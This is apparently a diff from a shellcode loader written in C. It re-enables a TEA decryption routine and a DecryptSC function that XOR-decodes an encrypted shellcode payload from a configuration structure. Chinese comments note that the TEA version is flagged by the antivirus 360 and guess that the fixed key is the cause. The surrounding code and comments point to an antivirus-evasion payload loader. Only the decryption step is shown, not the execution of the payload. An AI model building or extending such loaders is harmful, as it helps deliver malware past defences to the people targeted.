@@ -60,169 +60,169 @@ bool ForSD()
 * tea加密
 * 360直接报毒
 */
-//void decrypt_tea(unsigned long* in, unsigned long* key, unsigned long* out)
-//{
-//
-//	unsigned long code[4];
-//	register unsigned long n = 0x10, sum, y, z, delta = 0xab451fc4;
-//
-//	sum = delta * n;
-//	y = htonl(in[0]);
-//	z = htonl(in[1]);
-//
-//	code[0] = htonl(key[0]); code[1] = htonl(key[1]);
-//	code[2] = htonl(key[2]); code[3] = htonl(key[3]);
-//
-//	while (n-- > 0)
-//	{
-//		z -= ((y >> 5) + code[3]) ^ ((y << 4) + code[2]) ^ (sum + y);
-//		y -= ((z >> 5) + code[1]) ^ ((z << 4) + code[0]) ^ (sum + z);
-//		sum -= delta;
-//	}
-//	out[0] = htonl(y);
-//	out[1] = htonl(z);
-//}
+void decrypt_tea(unsigned long* in, unsigned long* key, unsigned long* out)
+{
+
+	unsigned long code[4];
+	register unsigned long n = 0x10, sum, y, z, delta = 0xab451fc4;
+
+	sum = delta * n;
+	y = htonl(in[0]);
+	z = htonl(in[1]);
+
+	code[0] = htonl(key[0]); code[1] = htonl(key[1]);
+	code[2] = htonl(key[2]); code[3] = htonl(key[3]);
+
+	while (n-- > 0)
+	{
+		z -= ((y >> 5) + code[3]) ^ ((y << 4) + code[2]) ^ (sum + y);
+		y -= ((z >> 5) + code[1]) ^ ((z << 4) + code[0]) ^ (sum + z);
+		sum -= delta;
+	}
+	out[0] = htonl(y);
+	out[1] = htonl(z);
+}
 
 /*
 * tea加密
 * 360直接报毒
 */
-//void tea_decrypt(unsigned char* in, unsigned int inlen, unsigned char* key, unsigned char** out, unsigned int* outlen)
-//{
-//	unsigned char q[8], mkey[8], * q1, * q2, * outp;
-//	register int count, i, j, p;
-//
-//	if (inlen % 8 || inlen < 16) return;
-//	/* get basic information of the packet */
-//	decrypt_tea((unsigned long*)in, (unsigned long*)key, (unsigned long*)q);
-//	j = q[0] & 0x7;
-//	count = inlen - j - 10;
-//	*outlen = count;
-//	*out = (unsigned char*)malloc(*outlen);
-//	if (*out == NULL) return;
-//	memset(*out, 0, *outlen);
-//
-//
-//	if (count < 0) return;
-//
-//	memset(mkey, 0, 8);
-//	q2 = mkey;
-//	i = 8; p = 1;
-//	q1 = in + 8;
-//	j++;
-//	while (p <= 2)
-//	{
-//		if (j < 8)
-//		{
-//			j++;
-//			p++;
-//		}
-//		else if (j == 8)
-//		{
-//			q2 = in;
-//			for (j = 0; j < 8; j++)
-//			{
-//				if (i + j >= inlen) return;
-//				q[j] ^= q1[j];
-//			}
-//			decrypt_tea((unsigned long*)q, (unsigned long*)key,
-//				(unsigned long*)q);
-//			i += 8;
-//			q1 += 8;
-//			j = 0;
-//		}
-//	}
-//	outp = *out;
-//	while (count != 0)
-//	{
-//		if (j < 8)
-//		{
-//			outp[0] = q2[j] ^ q[j];
-//			outp++;
-//			count--;
-//			j++;
-//		}
-//		else if (j == 8)
-//		{
-//			q2 = q1 - 8;
-//			for (j = 0; j < 8; j++)
-//			{
-//				if (i + j >= inlen)
-//					return;
-//				q[j] ^= q1[j];
-//			}
-//			decrypt_tea((unsigned long*)q, (unsigned long*)key,
-//				(unsigned long*)q);
-//			i += 8;
-//			q1 += 8;
-//			j = 0;
-//		}
-//	}
-//	for (p = 1; p < 8; p++)
-//	{
-//		if (j < 8)
-//		{
-//			if (q2[j] ^ q[j])
-//				return;
-//			j++;
-//		}
-//		else if (j == 8)
-//		{
-//			q2 = q1;
-//			for (j = 0; j < 8; j++)
-//			{
-//				if (i + j >= inlen)
-//					return;
-//				q[j] ^= q1[j];
-//			}
-//			decrypt_tea((unsigned long*)q, (unsigned long*)key,
-//				(unsigned long*)q);
-//			i += 8;
-//			q1 += 8;
-//			j = 0;
-//		}
-//	}
-//}
+void tea_decrypt(unsigned char* in, unsigned int inlen, unsigned char* key, unsigned char** out, unsigned int* outlen)
+{
+	unsigned char q[8], mkey[8], * q1, * q2, * outp;
+	register int count, i, j, p;
+
+	if (inlen % 8 || inlen < 16) return;
+	/* get basic information of the packet */
+	decrypt_tea((unsigned long*)in, (unsigned long*)key, (unsigned long*)q);
+	j = q[0] & 0x7;
+	count = inlen - j - 10;
+	*outlen = count;
+	*out = (unsigned char*)malloc(*outlen);
+	if (*out == NULL) return;
+	memset(*out, 0, *outlen);
+
+
+	if (count < 0) return;
+
+	memset(mkey, 0, 8);
+	q2 = mkey;
+	i = 8; p = 1;
+	q1 = in + 8;
+	j++;
+	while (p <= 2)
+	{
+		if (j < 8)
+		{
+			j++;
+			p++;
+		}
+		else if (j == 8)
+		{
+			q2 = in;
+			for (j = 0; j < 8; j++)
+			{
+				if (i + j >= inlen) return;
+				q[j] ^= q1[j];
+			}
+			decrypt_tea((unsigned long*)q, (unsigned long*)key,
+				(unsigned long*)q);
+			i += 8;
+			q1 += 8;
+			j = 0;
+		}
+	}
+	outp = *out;
+	while (count != 0)
+	{
+		if (j < 8)
+		{
+			outp[0] = q2[j] ^ q[j];
+			outp++;
+			count--;
+			j++;
+		}
+		else if (j == 8)
+		{
+			q2 = q1 - 8;
+			for (j = 0; j < 8; j++)
+			{
+				if (i + j >= inlen)
+					return;
+				q[j] ^= q1[j];
+			}
+			decrypt_tea((unsigned long*)q, (unsigned long*)key,
+				(unsigned long*)q);
+			i += 8;
+			q1 += 8;
+			j = 0;
+		}
+	}
+	for (p = 1; p < 8; p++)
+	{
+		if (j < 8)
+		{
+			if (q2[j] ^ q[j])
+				return;
+			j++;
+		}
+		else if (j == 8)
+		{
+			q2 = q1;
+			for (j = 0; j < 8; j++)
+			{
+				if (i + j >= inlen)
+					return;
+				q[j] ^= q1[j];
+			}
+			decrypt_tea((unsigned long*)q, (unsigned long*)key,
+				(unsigned long*)q);
+			i += 8;
+			q1 += 8;
+			j = 0;
+		}
+	}
+}
 
 /*
 * 从加密数据解密shellcode
 * tea加密会报毒，有可能是固定密钥的问题
 */
-//int DecryptSC(struct ConfigurationData* config,unsigned char *encData,unsigned int encDataSize)
-//{
-//	//unsigned int dwBaseAddr = VirtualAlloc(0, config->shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-//	//if (!dwBaseAddr) return -1;
-//
-//	if (encData[0] == H_ENC_XOR)
-//	{
-//		int encdatasize = *(unsigned int*)(encData + 1 + 16);
-//		for (int i = 0; i < encdatasize; i++)
-//		{
-//			(encData + 1 + 16 + 4)[i] ^= (encData + 1)[i % 0x10];
-//		}
-//	}
-//	else if (encData[0] == H_ENC_AES)
-//	{
-//
-//	}
-//	else if (encData[0] == H_ENC_RC4)
-//	{
-//
-//	}
-//	else if (encData[0] == H_ENC_TEA)
-//	{
-//		//int encdatasize = *(unsigned int*)(encData + 1 + 16);
-//		////TEA加密
-//		//tea_decrypt((encData + 1 + 16 + 4), encdatasize, (encData + 1) , &config->shellcode, (unsigned int*)&config->shellcodeSize);
-//		//if (config->shellcode == NULL) {
-//		//	return -1;
-//		//}
-//	}
-//	else
-//		return -1;
-//
-//	return 0;
-//}
+int DecryptSC(struct ConfigurationData* config,unsigned char *encData,unsigned int encDataSize)
+{
+	//unsigned int dwBaseAddr = VirtualAlloc(0, config->shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	//if (!dwBaseAddr) return -1;
+
+	if (encData[0] == H_ENC_XOR)
+	{
+		int encdatasize = *(unsigned int*)(encData + 1 + 16);
+		for (int i = 0; i < encdatasize; i++)
+		{
+			(encData + 1 + 16 + 4)[i] ^= (encData + 1)[i % 0x10];
+		}
+	}
+	else if (encData[0] == H_ENC_AES)
+	{
+
+	}
+	else if (encData[0] == H_ENC_RC4)
+	{
+
+	}
+	else if (encData[0] == H_ENC_TEA)
+	{
+		//int encdatasize = *(unsigned int*)(encData + 1 + 16);
+		////TEA加密
+		//tea_decrypt((encData + 1 + 16 + 4), encdatasize, (encData + 1) , &config->shellcode, (unsigned int*)&config->shellcodeSize);
+		//if (config->shellcode == NULL) {
+		//	return -1;
+		//}
+	}
+	else
+		return -1;
+
+	return 0;
+}
 
 /*
 * 从文件获取shellcode
